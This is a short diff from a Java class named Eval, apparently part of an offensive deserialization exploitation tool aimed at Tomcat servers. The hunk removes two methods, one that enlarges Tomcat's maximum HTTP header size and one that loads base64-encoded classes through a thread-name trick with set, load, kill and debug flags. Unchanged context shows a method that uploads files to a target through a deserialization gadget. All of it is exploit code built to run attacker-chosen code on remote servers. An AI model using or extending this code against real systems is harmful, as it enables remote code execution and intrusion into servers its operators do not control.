@@ -72,26 +72,6 @@ public class Eval {
         return o;
     }
 
-    public Object setTomcatMaxHttpHeaderSize(Class gadget,int size) throws Exception{
-        String jsp = new String(ReadWrite.readResource(Eval.class, "eval/tomcat_header_setMaxHttpHeaderSize.jsp"));
-        String java = getJavaCodeFromJSP(jsp);
-        java = java.replace("%headerSize%",String.valueOf(size));
-        return getObject(gadget,java);
-    }
-
-    public Object loadClassFromThreadName(Class gadget , String flag , String b64OrClassName) throws Exception{
-        if (flag.equals("set") || flag.equals("load") || flag.equals("kill") || flag.equals("debug")){
-            String jsp = new String(ReadWrite.readResource(Eval.class,"eval/tomcat_header_setThreadName.jsp"));
-            String java = getJavaCodeFromJSP(jsp);
-            java = java.replace("%flag%",flag);
-            if (b64OrClassName != null){
-                java = java.replace("%b64%",b64OrClassName).replace("%className%",b64OrClassName);
-            }
-            return getObject(gadget,java);
-        }
-        throw new Exception("[!] flag must be one of set , load , kill , debug");
-    }
-
     public Object uploadFile(Class gadget,String souce, String destination) throws Exception{
         byte[] content = ReadWrite.readFile(souce);
         return uploadFile(gadget,content,destination);
